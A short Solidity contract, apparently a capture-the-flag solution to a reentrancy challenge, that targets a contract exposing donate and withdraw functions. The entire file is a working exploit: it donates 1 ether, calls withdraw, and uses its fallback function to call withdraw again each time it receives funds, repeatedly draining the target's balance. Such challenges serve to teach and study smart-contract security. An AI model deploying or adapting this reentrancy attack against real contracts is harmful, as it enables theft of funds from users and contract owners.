// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.8.0;


interface IReenter{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}
 
contract Solution {
    
    IReenter instant;
    
    constructor(address _instant) payable {
        instant = IReenter(_instant);    
    }
    
    function deposit() public payable {
       IReenter(instant).donate{value: 1 ether}(address(this));
    }
    
    function ReentrancyHack() public {
        IReenter(instant).withdraw(1 ether);
    }
    
    fallback() external payable {
        instant.withdraw(msg.value);
    }
}

